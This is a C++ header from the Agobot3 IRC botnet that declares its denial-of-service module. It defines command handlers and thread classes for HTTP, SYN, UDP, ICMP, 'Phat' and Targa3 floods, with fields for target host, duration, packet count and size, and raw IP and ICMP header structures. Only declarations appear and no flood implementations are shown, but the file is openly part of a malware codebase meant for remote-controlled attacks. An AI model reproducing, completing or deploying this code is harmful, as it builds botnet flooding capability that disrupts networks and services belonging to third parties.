/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#ifndef __DDOS_H__
#define __DDOS_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

#define FIN  0x01
#define SYN  0x02
#define RST  0x04
#define PUSH 0x08
#define ACK  0x10
#define URG  0x20

#define IP 0
#define ICMP 1
#define IGMP 2
#define TCP 6
#define UDP 17
#define RAW 255

#define ICMP_ECHOREPLY	0
#define ICMP_ECHO	8

class CDDOS : public CCommandHandler
{
public:
	bool Init();

	bool HandleCommand(CMessage *pMsg);
	
	CommandInfo		 m_cmdPing, m_cmdUDP, m_cmdSyn, m_cmdHTTPFlood, m_cmdStopDDOS, 
				 m_cmdPhatSyn, m_cmdPhatICMP, m_cmdPhatWonk, m_cmdTarga3;
	int			 m_iNumThreads;
	bool		 m_bDDOSing;
};

class CDDOSBase : public CThread
{
public:
	CDDOSBase() { m_szType="CDDOSBase"; }
	virtual ~CDDOSBase() { }
	virtual void *Run();

	virtual void StartDDOS();

	CString		 m_sDDOSName;

	CString		 m_sHost;		// The Host to DDOS
	int			 m_iTime;		// Number of seconds DDOS is running
	int			 m_iDelay;		// Packet Delay
	int			 m_iPort;		// Port number / 0 for random
	int			 m_iNumber;		// Number of Packets
	int			 m_iSize;		// Size of Packets
	CString		 m_sURL;		// URL for HTTP flood
	CString		 m_sReferrer;	// URL for HTTP flood referrer
	bool		 m_bRecursive;	// Recursive option for HTTP flood

	CMessage	 m_cMsg;

	CDDOS		*m_pDDOS;
};

class CDDOSHTTPFlood : public CDDOSBase
{
public:
	CDDOSHTTPFlood();
	virtual void StartDDOS();
};

class CDDOSSynFlood : public CDDOSBase
{
public:
	CDDOSSynFlood();
	virtual void StartDDOS();
};

class CDDOSUDPFlood : public CDDOSBase
{
public:
	CDDOSUDPFlood();
	virtual void StartDDOS();
};

class CDDOSPhatSynFlood : public CDDOSBase
{
public:
	CDDOSPhatSynFlood();
	virtual void StartDDOS();
};

class CDDOSPhatICMPFlood : public CDDOSBase
{
public:
	CDDOSPhatICMPFlood();
	virtual void StartDDOS();
};

class CDDOSTarga3 : public CDDOSBase
{
public:
	CDDOSTarga3();
	virtual void StartDDOS();
};

class CDDOSPhatWonkFlood : public CDDOSBase
{
public:
	CDDOSPhatWonkFlood();
	virtual void StartDDOS();
};

typedef char s8;
typedef unsigned char u8;
typedef short int s16;
typedef unsigned short int u16;
typedef int s32;
typedef unsigned int u32;

struct iph
{
	unsigned char ihl:4;
	unsigned char version:4;
	unsigned char tos;
	unsigned short int tot_len;
	unsigned short int id;
	unsigned short int frag_off;
	unsigned char ttl;
	unsigned char protocol;
	unsigned short int check;
	unsigned int saddr;
	unsigned int daddr;
};

struct icmp
  {
    u8 type, code;
    u16 sum;
    u16 id, seq;
  };

#endif // __DDOS_H__
